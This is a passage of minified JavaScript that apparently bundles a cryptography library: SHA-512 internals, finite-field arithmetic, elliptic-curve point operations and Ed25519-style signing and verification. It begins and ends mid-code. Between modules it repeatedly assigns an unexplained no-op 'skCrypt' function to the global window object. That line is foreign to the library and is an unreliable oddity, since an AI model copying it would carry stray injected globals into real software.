          "0x7137449123ef65cd",
          "0xb5c0fbcfec4d3b2f",
          "0xe9b5dba58189dbbc",
          "0x3956c25bf348b538",
          "0x59f111f1b605d019",
          "0x923f82a4af194f9b",
          "0xab1c5ed5da6d8118",
          "0xd807aa98a3030242",
          "0x12835b0145706fbe",
          "0x243185be4ee4b28c",
          "0x550c7dc3d5ffb4e2",
          "0x72be5d74f27b896f",
          "0x80deb1fe3b1696b1",
          "0x9bdc06a725c71235",
          "0xc19bf174cf692694",
          "0xe49b69c19ef14ad2",
          "0xefbe4786384f25e3",
          "0x0fc19dc68b8cd5b5",
          "0x240ca1cc77ac9c65",
          "0x2de92c6f592b0275",
          "0x4a7484aa6ea6e483",
          "0x5cb0a9dcbd41fbd4",
          "0x76f988da831153b5",
          "0x983e5152ee66dfab",
          "0xa831c66d2db43210",
          "0xb00327c898fb213f",
          "0xbf597fc7beef0ee4",
          "0xc6e00bf33da88fc2",
          "0xd5a79147930aa725",
          "0x06ca6351e003826f",
          "0x142929670a0e6e70",
          "0x27b70a8546d22ffc",
          "0x2e1b21385c26c926",
          "0x4d2c6dfc5ac42aed",
          "0x53380d139d95b3df",
          "0x650a73548baf63de",
          "0x766a0abb3c77b2a8",
          "0x81c2c92e47edaee6",
          "0x92722c851482353b",
          "0xa2bfe8a14cf10364",
          "0xa81a664bbc423001",
          "0xc24b8b70d0f89791",
          "0xc76c51a30654be30",
          "0xd192e819d6ef5218",
          "0xd69906245565a910",
          "0xf40e35855771202a",
          "0x106aa07032bbd1b8",
          "0x19a4c116b8d2d0c8",
          "0x1e376c085141ab53",
          "0x2748774cdf8eeb99",
          "0x34b0bcb5e19b48a8",
          "0x391c0cb3c5c95a63",
          "0x4ed8aa4ae3418acb",
          "0x5b9cca4f7763e373",
          "0x682e6ff3d6b2b8a3",
          "0x748f82ee5defb2fc",
          "0x78a5636f43172f60",
          "0x84c87814a1f0ab72",
          "0x8cc702081a6439ec",
          "0x90befffa23631e28",
          "0xa4506cebde82bde9",
          "0xbef9a3f7b2c67915",
          "0xc67178f2e372532b",
          "0xca273eceea26619c",
          "0xd186b8c721c0c207",
          "0xeada7dd6cde0eb1e",
          "0xf57d4f7fee6ed178",
          "0x06f067aa72176fba",
          "0x0a637dc5a2c898a6",
          "0x113f9804bef90dae",
          "0x1b710b35131c471b",
          "0x28db77f523047d84",
          "0x32caab7b40c72493",
          "0x3c9ebe0a15c9bebc",
          "0x431d67c49c100d4c",
          "0x4cc5d4becb3e42b6",
          "0x597f299cfc657e2a",
          "0x5fcb6fab3ad6faec",
          "0x6c44198c4a475817",
        ].map((t) => BigInt(t))
      ))(),
    fe = (() => de[0])(),
    he = (() => de[1])(),
    pe = new Uint32Array(80),
    me = new Uint32Array(80);
  class ge extends Wt {
    constructor(t = 64) {
      super(128, t, 16, !1),
        (this.Ah = 0 | jt[0]),
        (this.Al = 0 | jt[1]),
        (this.Bh = 0 | jt[2]),
        (this.Bl = 0 | jt[3]),
        (this.Ch = 0 | jt[4]),
        (this.Cl = 0 | jt[5]),
        (this.Dh = 0 | jt[6]),
        (this.Dl = 0 | jt[7]),
        (this.Eh = 0 | jt[8]),
        (this.El = 0 | jt[9]),
        (this.Fh = 0 | jt[10]),
        (this.Fl = 0 | jt[11]),
        (this.Gh = 0 | jt[12]),
        (this.Gl = 0 | jt[13]),
        (this.Hh = 0 | jt[14]),
        (this.Hl = 0 | jt[15]);
    }
    get() {
      const {
        Ah: t,
        Al: e,
        Bh: n,
        Bl: r,
        Ch: o,
        Cl: i,
        Dh: s,
        Dl: a,
        Eh: u,
        El: c,
        Fh: l,
        Fl: d,
        Gh: f,
        Gl: h,
        Hh: p,
        Hl: m,
      } = this;
      return [t, e, n, r, o, i, s, a, u, c, l, d, f, h, p, m];
    }
    set(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p, m) {
      (this.Ah = 0 | t),
        (this.Al = 0 | e),
        (this.Bh = 0 | n),
        (this.Bl = 0 | r),
        (this.Ch = 0 | o),
        (this.Cl = 0 | i),
        (this.Dh = 0 | s),
        (this.Dl = 0 | a),
        (this.Eh = 0 | u),
        (this.El = 0 | c),
        (this.Fh = 0 | l),
        (this.Fl = 0 | d),
        (this.Gh = 0 | f),
        (this.Gl = 0 | h),
        (this.Hh = 0 | p),
        (this.Hl = 0 | m);
    }
    process(t, e) {
      for (let w = 0; w < 16; w++, e += 4)
        (pe[w] = t.getUint32(e)), (me[w] = t.getUint32((e += 4)));
      for (let w = 16; w < 80; w++) {
        const t = 0 | pe[w - 15],
          e = 0 | me[w - 15],
          n = Yt(t, e, 1) ^ Yt(t, e, 8) ^ Xt(t, 0, 7),
          r = Qt(t, e, 1) ^ Qt(t, e, 8) ^ Jt(t, e, 7),
          o = 0 | pe[w - 2],
          i = 0 | me[w - 2],
          s = Yt(o, i, 19) ^ $t(o, i, 61) ^ Xt(o, 0, 6),
          a = Qt(o, i, 19) ^ te(o, i, 61) ^ Jt(o, i, 6),
          u = oe(r, a, me[w - 7], me[w - 16]),
          c = ie(u, n, s, pe[w - 7], pe[w - 16]);
        (pe[w] = 0 | c), (me[w] = 0 | u);
      }
      let {
        Ah: n,
        Al: r,
        Bh: o,
        Bl: i,
        Ch: s,
        Cl: a,
        Dh: u,
        Dl: c,
        Eh: l,
        El: d,
        Fh: f,
        Fl: h,
        Gh: p,
        Gl: m,
        Hh: g,
        Hl: y,
      } = this;
      for (let w = 0; w < 80; w++) {
        const t = Yt(l, d, 14) ^ Yt(l, d, 18) ^ $t(l, d, 41),
          e = Qt(l, d, 14) ^ Qt(l, d, 18) ^ te(l, d, 41),
          b = (l & f) ^ (~l & p),
          v = se(y, e, (d & h) ^ (~d & m), he[w], me[w]),
          A = ae(v, g, t, b, fe[w], pe[w]),
          k = 0 | v,
          I = Yt(n, r, 28) ^ $t(n, r, 34) ^ $t(n, r, 39),
          S = Qt(n, r, 28) ^ te(n, r, 34) ^ te(n, r, 39),
          _ = (n & o) ^ (n & s) ^ (o & s),
          T = (r & i) ^ (r & a) ^ (i & a);
        (g = 0 | p),
          (y = 0 | m),
          (p = 0 | f),
          (m = 0 | h),
          (f = 0 | l),
          (h = 0 | d),
          ({ h: l, l: d } = ee(0 | u, 0 | c, 0 | A, 0 | k)),
          (u = 0 | s),
          (c = 0 | a),
          (s = 0 | o),
          (a = 0 | i),
          (o = 0 | n),
          (i = 0 | r);
        const B = ne(k, S, T);
        (n = re(B, A, I, _)), (r = 0 | B);
      }
      ({ h: n, l: r } = ee(0 | this.Ah, 0 | this.Al, 0 | n, 0 | r)),
        ({ h: o, l: i } = ee(0 | this.Bh, 0 | this.Bl, 0 | o, 0 | i)),
        ({ h: s, l: a } = ee(0 | this.Ch, 0 | this.Cl, 0 | s, 0 | a)),
        ({ h: u, l: c } = ee(0 | this.Dh, 0 | this.Dl, 0 | u, 0 | c)),
        ({ h: l, l: d } = ee(0 | this.Eh, 0 | this.El, 0 | l, 0 | d)),
        ({ h: f, l: h } = ee(0 | this.Fh, 0 | this.Fl, 0 | f, 0 | h)),
        ({ h: p, l: m } = ee(0 | this.Gh, 0 | this.Gl, 0 | p, 0 | m)),
        ({ h: g, l: y } = ee(0 | this.Hh, 0 | this.Hl, 0 | g, 0 | y)),
        this.set(n, r, o, i, s, a, u, c, l, d, f, h, p, m, g, y);
    }
    roundClean() {
      bt(pe, me);
    }
    destroy() {
      bt(this.buffer), this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    }
  }
  const ye = Ut(() => new le()),
    we = Ut(() => new ge());
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const be = BigInt(0),
    ve = BigInt(1);
  function Ae(t, e) {
    if ("boolean" != typeof e)
      throw new Error(t + " boolean expected, got " + e);
  }
  function ke(t) {
    const e = t.toString(16);
    return 1 & e.length ? "0" + e : e;
  }
  function Ie(t) {
    if ("string" != typeof t)
      throw new Error("hex string expected, got " + typeof t);
    return "" === t ? be : BigInt("0x" + t);
  }
  function Se(t) {
    return Ie(Tt(t));
  }
  function _e(t) {
    return gt(t), Ie(Tt(Uint8Array.from(t).reverse()));
  }
  function Te(t, e) {
    return Mt(t.toString(16).padStart(2 * e, "0"));
  }
  function Be(t, e) {
    return Te(t, e).reverse();
  }
  function Ce(t, e, n) {
    let r;
    if ("string" == typeof e)
      try {
        r = Mt(e);
      } catch (i) {
        throw new Error(t + " must be hex string or Uint8Array, cause: " + i);
      }
    else {
      if (!pt(e)) throw new Error(t + " must be hex string or Uint8Array");
      r = Uint8Array.from(e);
    }
    const o = r.length;
    if ("number" == typeof n && o !== n)
      throw new Error(t + " of length " + n + " expected, got " + o);
    return r;
  }
  const Ee = (t) => "bigint" == typeof t && be <= t;
  function xe(t, e, n, r) {
    if (
      !(function (t, e, n) {
        return Ee(t) && Ee(e) && Ee(n) && e <= t && t < n;
      })(e, n, r)
    )
      throw new Error(
        "expected valid " + t + ": " + n + " <= n < " + r + ", got " + e
      );
  }
  const Pe = (t) => (ve << BigInt(t)) - ve;
  function Oe(t, e, n = {}) {
    if (!t || "object" != typeof t)
      throw new Error("expected valid options object");
    function r(e, n, r) {
      const o = t[e];
      if (r && void 0 === o) return;
      const i = typeof o;
      if (i !== n || null === o)
        throw new Error(`param "${e}" is invalid: expected ${n}, got ${i}`);
    }
    Object.entries(e).forEach(([t, e]) => r(t, e, !1)),
      Object.entries(n).forEach(([t, e]) => r(t, e, !0));
  }
  function Re(t) {
    const e = new WeakMap();
    return (n, ...r) => {
      const o = e.get(n);
      if (void 0 !== o) return o;
      const i = t(n, ...r);
      return e.set(n, i), i;
    };
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Me = BigInt(0),
    Le = BigInt(1),
    Ne = BigInt(2),
    De = BigInt(3),
    Ue = BigInt(4),
    qe = BigInt(5),
    ze = BigInt(8);
  function Ke(t, e) {
    const n = t % e;
    return n >= Me ? n : e + n;
  }
  function We(t, e, n) {
    let r = t;
    for (; e-- > Me; ) (r *= r), (r %= n);
    return r;
  }
  function Fe(t, e) {
    if (t === Me) throw new Error("invert: expected non-zero number");
    if (e <= Me) throw new Error("invert: expected positive modulus, got " + e);
    let n = Ke(t, e),
      r = e,
      o = Me,
      i = Le;
    for (; n !== Me; ) {
      const t = r % n,
        e = o - i * (r / n);
      (r = n), (n = t), (o = i), (i = e);
    }
    if (r !== Le) throw new Error("invert: does not exist");
    return Ke(o, e);
  }
  function je(t, e) {
    const n = (t.ORDER + Le) / Ue,
      r = t.pow(e, n);
    if (!t.eql(t.sqr(r), e)) throw new Error("Cannot find square root");
    return r;
  }
  function Ge(t, e) {
    const n = (t.ORDER - qe) / ze,
      r = t.mul(e, Ne),
      o = t.pow(r, n),
      i = t.mul(e, o),
      s = t.mul(t.mul(i, Ne), o),
      a = t.mul(i, t.sub(s, t.ONE));
    if (!t.eql(t.sqr(a), e)) throw new Error("Cannot find square root");
    return a;
  }
  function Ve(t) {
    return t % Ue === De
      ? je
      : t % ze === qe
      ? Ge
      : (function (t) {
          if (t < BigInt(3))
            throw new Error("sqrt is not defined for small field");
          let e = t - Le,
            n = 0;
          for (; e % Ne === Me; ) (e /= Ne), n++;
          let r = Ne;
          const o = Je(t);
          for (; 1 === Xe(o, r); )
            if (r++ > 1e3)
              throw new Error("Cannot find square root: probably non-prime P");
          if (1 === n) return je;
          let i = o.pow(r, e);
          const s = (e + Le) / Ne;
          return function (t, r) {
            if (t.is0(r)) return r;
            if (1 !== Xe(t, r)) throw new Error("Cannot find square root");
            let o = n,
              a = t.mul(t.ONE, i),
              u = t.pow(r, e),
              c = t.pow(r, s);
            for (; !t.eql(u, t.ONE); ) {
              if (t.is0(u)) return t.ZERO;
              let e = 1,
                n = t.sqr(u);
              for (; !t.eql(n, t.ONE); )
                if ((e++, (n = t.sqr(n)), e === o))
                  throw new Error("Cannot find square root");
              const r = Le << BigInt(o - e - 1),
                i = t.pow(a, r);
              (o = e), (a = t.sqr(i)), (u = t.mul(u, a)), (c = t.mul(c, i));
            }
            return c;
          };
        })(t);
  }
  const He = [
    "create",
    "isValid",
    "is0",
    "neg",
    "inv",
    "sqrt",
    "sqr",
    "eql",
    "add",
    "sub",
    "mul",
    "pow",
    "div",
    "addN",
    "subN",
    "mulN",
    "sqrN",
  ];
  function Ze(t, e, n = !1) {
    const r = new Array(e.length).fill(n ? t.ZERO : void 0),
      o = e.reduce(
        (e, n, o) => (t.is0(n) ? e : ((r[o] = e), t.mul(e, n))),
        t.ONE
      ),
      i = t.inv(o);
    return (
      e.reduceRight(
        (e, n, o) => (t.is0(n) ? e : ((r[o] = t.mul(e, r[o])), t.mul(e, n))),
        i
      ),
      r
    );
  }
  function Xe(t, e) {
    const n = (t.ORDER - Le) / Ne,
      r = t.pow(e, n),
      o = t.eql(r, t.ONE),
      i = t.eql(r, t.ZERO),
      s = t.eql(r, t.neg(t.ONE));
    if (!o && !i && !s) throw new Error("invalid Legendre symbol result");
    return o ? 1 : i ? 0 : -1;
  }
  function Je(t, e, n = !1, r = {}) {
    if (t <= Me) throw new Error("invalid field: expected ORDER > 0, got " + t);
    let o, i;
    if ("object" == typeof e && null != e) {
      if (r.sqrt || n) throw new Error("cannot specify opts in two arguments");
      const t = e;
      t.BITS && (o = t.BITS),
        t.sqrt && (i = t.sqrt),
        "boolean" == typeof t.isLE && (n = t.isLE);
    } else "number" == typeof e && (o = e), r.sqrt && (i = r.sqrt);
    const { nBitLength: s, nByteLength: a } = (function (t, e) {
      void 0 !== e && mt(e);
      const n = void 0 !== e ? e : t.toString(2).length;
      return { nBitLength: n, nByteLength: Math.ceil(n / 8) };
    })(t, o);
    if (a > 2048)
      throw new Error("invalid field: expected ORDER of <= 2048 bytes");
    let u;
    const c = Object.freeze({
      ORDER: t,
      isLE: n,
      BITS: s,
      BYTES: a,
      MASK: Pe(s),
      ZERO: Me,
      ONE: Le,
      create: (e) => Ke(e, t),
      isValid: (e) => {
        if ("bigint" != typeof e)
          throw new Error(
            "invalid field element: expected bigint, got " + typeof e
          );
        return Me <= e && e < t;
      },
      is0: (t) => t === Me,
      isValidNot0: (t) => !c.is0(t) && c.isValid(t),
      isOdd: (t) => (t & Le) === Le,
      neg: (e) => Ke(-e, t),
      eql: (t, e) => t === e,
      sqr: (e) => Ke(e * e, t),
      add: (e, n) => Ke(e + n, t),
      sub: (e, n) => Ke(e - n, t),
      mul: (e, n) => Ke(e * n, t),
      pow: (t, e) =>
        (function (t, e, n) {
          if (n < Me)
            throw new Error("invalid exponent, negatives unsupported");
          if (n === Me) return t.ONE;
          if (n === Le) return e;
          let r = t.ONE,
            o = e;
          for (; n > Me; )
            n & Le && (r = t.mul(r, o)), (o = t.sqr(o)), (n >>= Le);
          return r;
        })(c, t, e),
      div: (e, n) => Ke(e * Fe(n, t), t),
      sqrN: (t) => t * t,
      addN: (t, e) => t + e,
      subN: (t, e) => t - e,
      mulN: (t, e) => t * e,
      inv: (e) => Fe(e, t),
      sqrt: i || ((e) => (u || (u = Ve(t)), u(c, e))),
      toBytes: (t) => (n ? Be(t, a) : Te(t, a)),
      fromBytes: (t) => {
        if (t.length !== a)
          throw new Error(
            "Field.fromBytes: expected " + a + " bytes, got " + t.length
          );
        return n ? _e(t) : Se(t);
      },
      invertBatch: (t) => Ze(c, t),
      cmov: (t, e, n) => (n ? e : t),
    });
    return Object.freeze(c);
  }
  function Ye(t) {
    if ("bigint" != typeof t) throw new Error("field order must be bigint");
    const e = t.toString(2).length;
    return Math.ceil(e / 8);
  }
  function Qe(t) {
    const e = Ye(t);
    return e + Math.ceil(e / 2);
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const $e = BigInt(0),
    tn = BigInt(1);
  function en(t, e) {
    const n = e.negate();
    return t ? n : e;
  }
  function nn(t, e, n) {
    const r = "pz" === e ? (t) => t.pz : (t) => t.ez,
      o = Ze(t.Fp, n.map(r));
    return n.map((t, e) => t.toAffine(o[e])).map(t.fromAffine);
  }
  function rn(t, e) {
    if (!Number.isSafeInteger(t) || t <= 0 || t > e)
      throw new Error(
        "invalid window size, expected [1.." + e + "], got W=" + t
      );
  }
  function on(t, e) {
    rn(t, e);
    const n = 2 ** t;
    return {
      windows: Math.ceil(e / t) + 1,
      windowSize: 2 ** (t - 1),
      mask: Pe(t),
      maxNumber: n,
      shiftBy: BigInt(t),
    };
  }
  function sn(t, e, n) {
    const { windowSize: r, mask: o, maxNumber: i, shiftBy: s } = n;
    let a = Number(t & o),
      u = t >> s;
    a > r && ((a -= i), (u += tn));
    const c = e * r;
    return {
      nextN: u,
      offset: c + Math.abs(a) - 1,
      isZero: 0 === a,
      isNeg: a < 0,
      isNegF: e % 2 != 0,
      offsetF: c,
    };
  }
  const an = new WeakMap(),
    un = new WeakMap();
  function cn(t) {
    return un.get(t) || 1;
  }
  function ln(t) {
    if (t !== $e) throw new Error("invalid wNAF");
  }
  function dn(t, e) {
    return {
      constTimeNegate: en,
      hasPrecomputes: (t) => 1 !== cn(t),
      unsafeLadder(e, n, r = t.ZERO) {
        let o = e;
        for (; n > $e; ) n & tn && (r = r.add(o)), (o = o.double()), (n >>= tn);
        return r;
      },
      precomputeWindow(t, n) {
        const { windows: r, windowSize: o } = on(n, e),
          i = [];
        let s = t,
          a = s;
        for (let e = 0; e < r; e++) {
          (a = s), i.push(a);
          for (let t = 1; t < o; t++) (a = a.add(s)), i.push(a);
          s = a.double();
        }
        return i;
      },
      wNAF(n, r, o) {
        let i = t.ZERO,
          s = t.BASE;
        const a = on(n, e);
        for (let t = 0; t < a.windows; t++) {
          const {
            nextN: e,
            offset: n,
            isZero: u,
            isNeg: c,
            isNegF: l,
            offsetF: d,
          } = sn(o, t, a);
          (o = e), u ? (s = s.add(en(l, r[d]))) : (i = i.add(en(c, r[n])));
        }
        return ln(o), { p: i, f: s };
      },
      wNAFUnsafe(n, r, o, i = t.ZERO) {
        const s = on(n, e);
        for (let t = 0; t < s.windows && o !== $e; t++) {
          const { nextN: e, offset: n, isZero: a, isNeg: u } = sn(o, t, s);
          if (((o = e), !a)) {
            const t = r[n];
            i = i.add(u ? t.negate() : t);
          }
        }
        return ln(o), i;
      },
      getPrecomputes(t, e, n) {
        let r = an.get(e);
        return (
          r ||
            ((r = this.precomputeWindow(e, t)),
            1 !== t && ("function" == typeof n && (r = n(r)), an.set(e, r))),
          r
        );
      },
      wNAFCached(t, e, n) {
        const r = cn(t);
        return this.wNAF(r, this.getPrecomputes(r, t, n), e);
      },
      wNAFCachedUnsafe(t, e, n, r) {
        const o = cn(t);
        return 1 === o
          ? this.unsafeLadder(t, e, r)
          : this.wNAFUnsafe(o, this.getPrecomputes(o, t, n), e, r);
      },
      setWindowSize(t, n) {
        rn(n, e), un.set(t, n), an.delete(t);
      },
    };
  }
  function fn(t, e, n, r) {
    !(function (t, e) {
      if (!Array.isArray(t)) throw new Error("array expected");
      t.forEach((t, n) => {
        if (!(t instanceof e)) throw new Error("invalid point at index " + n);
      });
    })(n, t),
      (function (t, e) {
        if (!Array.isArray(t)) throw new Error("array of scalars expected");
        t.forEach((t, n) => {
          if (!e.isValid(t)) throw new Error("invalid scalar at index " + n);
        });
      })(r, e);
    const o = n.length,
      i = r.length;
    if (o !== i)
      throw new Error("arrays of points and scalars must have equal length");
    const s = t.ZERO,
      a = (function (t) {
        let e;
        for (e = 0; t > be; t >>= ve, e += 1);
        return e;
      })(BigInt(o));
    let u = 1;
    a > 12 ? (u = a - 3) : a > 4 ? (u = a - 2) : a > 0 && (u = 2);
    const c = Pe(u),
      l = new Array(Number(c) + 1).fill(s);
    let d = s;
    for (let f = Math.floor((e.BITS - 1) / u) * u; f >= 0; f -= u) {
      l.fill(s);
      for (let e = 0; e < i; e++) {
        const t = r[e],
          o = Number((t >> BigInt(f)) & c);
        l[o] = l[o].add(n[e]);
      }
      let t = s;
      for (let e = l.length - 1, n = s; e > 0; e--)
        (n = n.add(l[e])), (t = t.add(n));
      if (((d = d.add(t)), 0 !== f)) for (let e = 0; e < u; e++) d = d.double();
    }
    return d;
  }
  function hn(t, e) {
    if (e) {
      if (e.ORDER !== t)
        throw new Error("Field.ORDER must match order: Fp == p, Fn == n");
      return (
        !(function (t) {
          return (
            Oe(
              t,
              He.reduce((t, e) => ((t[e] = "function"), t), {
                ORDER: "bigint",
                MASK: "bigint",
                BYTES: "number",
                BITS: "number",
              })
            ),
            t
          );
        })(e),
        e
      );
    }
    return Je(t);
  }
  function pn(t, e, n = {}) {
    if (!e || "object" != typeof e)
      throw new Error(`expected valid ${t} CURVE object`);
    for (const s of ["p", "n", "h"]) {
      const t = e[s];
      if (!("bigint" == typeof t && t > $e))
        throw new Error(`CURVE.${s} must be positive bigint`);
    }
    const r = hn(e.p, n.Fp),
      o = hn(e.n, n.Fn),
      i = ["Gx", "Gy", "a", "weierstrass" === t ? "b" : "d"];
    for (const s of i)
      if (!r.isValid(e[s]))
        throw new Error(`CURVE.${s} must be valid field element of CURVE.Fp`);
    return { Fp: r, Fn: o };
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const mn = BigInt(0),
    gn = BigInt(1),
    yn = BigInt(2),
    wn = BigInt(8),
    bn = { zip215: !0 };
  function vn(t, e) {
    Oe(
      e,
      { hash: "function" },
      {
        adjustScalarBytes: "function",
        randomBytes: "function",
        domain: "function",
        prehash: "function",
        mapToCurve: "function",
      }
    );
    const { prehash: n, hash: r } = e,
      { BASE: o, Fp: i, Fn: s } = t,
      a = s.ORDER,
      u = e.randomBytes || qt,
      c = e.adjustScalarBytes || ((t) => t),
      l =
        e.domain ||
        ((t, e, n) => {
          if ((Ae("phflag", n), e.length || n))
            throw new Error("Contexts/pre-hash are not supported");
          return t;
        });
    function d(t) {
      return s.create(t);
    }
    function f(t) {
      return d(_e(t));
    }
    function h(t) {
      const {
          head: e,
          prefix: n,
          scalar: s,
        } = (function (t) {
          const e = i.BYTES;
          t = Ce("private key", t, e);
          const n = Ce("hashed private key", r(t), 2 * e),
            o = c(n.slice(0, e));
          return { head: o, prefix: n.slice(e, 2 * e), scalar: f(o) };
        })(t),
        a = o.multiply(s),
        u = a.toBytes();
      return { head: e, prefix: n, scalar: s, point: a, pointBytes: u };
    }
    function p(t = Uint8Array.of(), ...e) {
      const o = Nt(...e);
      return f(r(l(o, Ce("context", t), !!n)));
    }
    const m = bn;
    o.precompute(8);
    return {
      getPublicKey: function (t) {
        return h(t).pointBytes;
      },
      sign: function (t, e, r = {}) {
        (t = Ce("message", t)), n && (t = n(t));
        const { prefix: s, scalar: u, pointBytes: c } = h(e),
          l = p(r.context, s, t),
          f = o.multiply(l).toBytes(),
          m = d(l + p(r.context, f, c, t) * u);
        xe("signature.s", m, mn, a);
        const g = i.BYTES;
        return Ce("result", Nt(f, Be(m, g)), 2 * g);
      },
      verify: function (e, r, s, a = m) {
        const { context: u, zip215: c } = a,
          l = i.BYTES;
        (e = Ce("signature", e, 2 * l)),
          (r = Ce("message", r)),
          (s = Ce("publicKey", s, l)),
          void 0 !== c && Ae("zip215", c),
          n && (r = n(r));
        const d = _e(e.slice(l, 2 * l));
        let f, h, g;
        try {
          (f = t.fromHex(s, c)),
            (h = t.fromHex(e.slice(0, l), c)),
            (g = o.multiplyUnsafe(d));
        } catch (w) {
          return !1;
        }
        if (!c && f.isSmallOrder()) return !1;
        const y = p(u, h.toBytes(), f.toBytes(), r);
        return h.add(f.multiplyUnsafe(y)).subtract(g).clearCofactor().is0();
      },
      utils: {
        getExtendedPublicKey: h,
        randomPrivateKey: () => u(i.BYTES),
        precompute: (e = 8, n = t.BASE) => n.precompute(e, !1),
      },
      Point: t,
    };
  }
  function An(t) {
    const {
        CURVE: e,
        curveOpts: n,
        eddsaOpts: r,
      } = (function (t) {
        const e = {
          a: t.a,
          d: t.d,
          p: t.Fp.ORDER,
          n: t.n,
          h: t.h,
          Gx: t.Gx,
          Gy: t.Gy,
        };
        return {
          CURVE: e,
          curveOpts: {
            Fp: t.Fp,
            Fn: Je(e.n, t.nBitLength, !0),
            uvRatio: t.uvRatio,
          },
          eddsaOpts: {
            hash: t.hash,
            randomBytes: t.randomBytes,
            adjustScalarBytes: t.adjustScalarBytes,
            domain: t.domain,
            prehash: t.prehash,
            mapToCurve: t.mapToCurve,
          },
        };
      })(t),
      o = (function (t, e = {}) {
        const { Fp: n, Fn: r } = pn("edwards", t, e),
          { h: o, n: i } = t;
        Oe(e, {}, { uvRatio: "function" });
        const s = yn << (BigInt(8 * r.BYTES) - gn),
          a = (t) => n.create(t),
          u =
            e.uvRatio ||
            ((t, e) => {
              try {
                return { isValid: !0, value: n.sqrt(n.div(t, e)) };
              } catch (r) {
                return { isValid: !1, value: mn };
              }
            });
        if (
          !(function (t, e, n, r) {
            const o = t.sqr(n),
              i = t.sqr(r),
              s = t.add(t.mul(e.a, o), i),
              a = t.add(t.ONE, t.mul(e.d, t.mul(o, i)));
            return t.eql(s, a);
          })(n, t, t.Gx, t.Gy)
        )
          throw new Error("bad curve params: generator point");
        function c(t, e, n = !1) {
          return xe("coordinate " + t, e, n ? gn : mn, s), e;
        }
        function l(t) {
          if (!(t instanceof h)) throw new Error("ExtendedPoint expected");
        }
        const d = Re((t, e) => {
            const { ex: r, ey: o, ez: i } = t,
              s = t.is0();
            null == e && (e = s ? wn : n.inv(i));
            const u = a(r * e),
              c = a(o * e),
              l = a(i * e);
            if (s) return { x: mn, y: gn };
            if (l !== gn) throw new Error("invZ was invalid");
            return { x: u, y: c };
          }),
          f = Re((e) => {
            const { a: n, d: r } = t;
            if (e.is0()) throw new Error("bad point: ZERO");
            const { ex: o, ey: i, ez: s, et: u } = e,
              c = a(o * o),
              l = a(i * i),
              d = a(s * s),
              f = a(d * d),
              h = a(c * n);
            if (a(d * a(h + l)) !== a(f + a(r * a(c * l))))
              throw new Error("bad point: equation left != right (1)");
            if (a(o * i) !== a(s * u))
              throw new Error("bad point: equation left != right (2)");
            return !0;
          });
        class h {
          constructor(t, e, n, r) {
            (this.ex = c("x", t)),
              (this.ey = c("y", e)),
              (this.ez = c("z", n, !0)),
              (this.et = c("t", r)),
              Object.freeze(this);
          }
          get x() {
            return this.toAffine().x;
          }
          get y() {
            return this.toAffine().y;
          }
          static fromAffine(t) {
            if (t instanceof h) throw new Error("extended point not allowed");
            const { x: e, y: n } = t || {};
            return c("x", e), c("y", n), new h(e, n, gn, a(e * n));
          }
          static normalizeZ(t) {
            return nn(h, "ez", t);
          }
          static msm(t, e) {
            return fn(h, r, t, e);
          }
          _setWindowSize(t) {
            this.precompute(t);
          }
          precompute(t = 8, e = !0) {
            return p.setWindowSize(this, t), e || this.multiply(yn), this;
          }
          assertValidity() {
            f(this);
          }
          equals(t) {
            l(t);
            const { ex: e, ey: n, ez: r } = this,
              { ex: o, ey: i, ez: s } = t,
              u = a(e * s),
              c = a(o * r),
              d = a(n * s),
              f = a(i * r);
            return u === c && d === f;
          }
          is0() {
            return this.equals(h.ZERO);
          }
          negate() {
            return new h(a(-this.ex), this.ey, this.ez, a(-this.et));
          }
          double() {
            const { a: e } = t,
              { ex: n, ey: r, ez: o } = this,
              i = a(n * n),
              s = a(r * r),
              u = a(yn * a(o * o)),
              c = a(e * i),
              l = n + r,
              d = a(a(l * l) - i - s),
              f = c + s,
              p = f - u,
              m = c - s,
              g = a(d * p),
              y = a(f * m),
              w = a(d * m),
              b = a(p * f);
            return new h(g, y, b, w);
          }
          add(e) {
            l(e);
            const { a: n, d: r } = t,
              { ex: o, ey: i, ez: s, et: u } = this,
              { ex: c, ey: d, ez: f, et: p } = e,
              m = a(o * c),
              g = a(i * d),
              y = a(u * r * p),
              w = a(s * f),
              b = a((o + i) * (c + d) - m - g),
              v = w - y,
              A = w + y,
              k = a(g - n * m),
              I = a(b * v),
              S = a(A * k),
              _ = a(b * k),
              T = a(v * A);
            return new h(I, S, T, _);
          }
          subtract(t) {
            return this.add(t.negate());
          }
          multiply(t) {
            const e = t;
            xe("scalar", e, gn, i);
            const { p: n, f: r } = p.wNAFCached(this, e, h.normalizeZ);
            return h.normalizeZ([n, r])[0];
          }
          multiplyUnsafe(t, e = h.ZERO) {
            const n = t;
            return (
              xe("scalar", n, mn, i),
              n === mn
                ? h.ZERO
                : this.is0() || n === gn
                ? this
                : p.wNAFCachedUnsafe(this, n, h.normalizeZ, e)
            );
          }
          isSmallOrder() {
            return this.multiplyUnsafe(o).is0();
          }
          isTorsionFree() {
            return p.wNAFCachedUnsafe(this, i).is0();
          }
          toAffine(t) {
            return d(this, t);
          }
          clearCofactor() {
            return o === gn ? this : this.multiplyUnsafe(o);
          }
          static fromBytes(t, e = !1) {
            return gt(t), this.fromHex(t, e);
          }
          static fromHex(e, r = !1) {
            const { d: o, a: i } = t,
              c = n.BYTES;
            (e = Ce("pointHex", e, c)), Ae("zip215", r);
            const l = e.slice(),
              d = e[c - 1];
            l[c - 1] = -129 & d;
            const f = _e(l),
              p = r ? s : n.ORDER;
            xe("pointHex.y", f, mn, p);
            const m = a(f * f),
              g = a(m - gn),
              y = a(o * m - i);
            let { isValid: w, value: b } = u(g, y);
            if (!w) throw new Error("Point.fromHex: invalid y coordinate");
            const v = (b & gn) === gn,
              A = !!(128 & d);
            if (!r && b === mn && A)
              throw new Error("Point.fromHex: x=0 and x_0=1");
            return A !== v && (b = a(-b)), h.fromAffine({ x: b, y: f });
          }
          static fromPrivateScalar(t) {
            return h.BASE.multiply(t);
          }
          toBytes() {
            const { x: t, y: e } = this.toAffine(),
              r = Be(e, n.BYTES);
            return (r[r.length - 1] |= t & gn ? 128 : 0), r;
          }
          toRawBytes() {
            return this.toBytes();
          }
          toHex() {
            return Tt(this.toBytes());
          }
          toString() {
